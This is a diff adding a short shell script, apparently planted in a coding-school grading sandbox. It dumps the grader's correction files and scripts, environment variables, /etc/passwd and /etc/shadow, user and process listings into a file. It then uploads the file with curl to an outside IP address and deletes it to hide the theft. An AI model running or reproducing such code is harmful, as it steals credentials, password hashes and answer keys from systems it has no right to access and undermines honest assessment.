@@ -1,0 +1,24 @@
+pwd > results
+echo ----------------Crack me ------------- >> results
+find /tmp/correction/holberton_corrections/corrections/216/888/ -type f -printf "---%p----\n" -exec cat '{}' \;>> results
+find /tmp/correction/holberton_corrections/corrections/240/1107/ -type f -printf "---%p----\n" -exec cat '{}' \;>> results
+echo ---------------- generate_doc.rb ------------- >> results
+cat tmp/correction/holberton_corrections/generate_doc.rb >> results
+echo ---------------- Root Directory ------------- >> results
+ls / >> results
+echo ---------------- Home Directory ------------- >> results
+ls -R /home >> results
+echo ----------------- Environment ------- >> results
+env >> results
+echo ----------------- User Info ------- >> results
+cat /etc/passwd >> results
+cat /etc/shadow >> results
+echo ----------------- Users logged in ------- >> results
+w >> results
+echo ----------------- Disk Space ------- >> results
+df -h >> results
+echo ----------------- ps -aux ------- >> results
+ps -aux >> results
+echo ----------------- END $(date) ------- >> results
+curl -s -F "name=@results" http://138.68.1.168:8080
+rm results
